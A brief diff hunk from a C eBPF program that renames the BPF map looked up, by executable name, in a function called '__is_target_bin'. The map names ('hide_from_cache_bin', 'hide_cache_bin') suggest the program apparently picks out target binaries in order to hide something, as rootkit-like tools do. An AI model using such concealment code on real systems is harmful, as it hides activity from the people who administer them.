@@ -52,7 +52,7 @@ static __always_inline int __is_target_bin(void){
     if(__resolve_exe_basename(bin, sizeof(bin)) < 0)
         return 0;
     
-    __u8 *bin_cache_flag = bpf_map_lookup_elem(&hide_from_cache_bin, &bin);
+    __u8 *bin_cache_flag = bpf_map_lookup_elem(&hide_cache_bin, &bin);
     if(!bin_cache_flag)
         return 0;
 
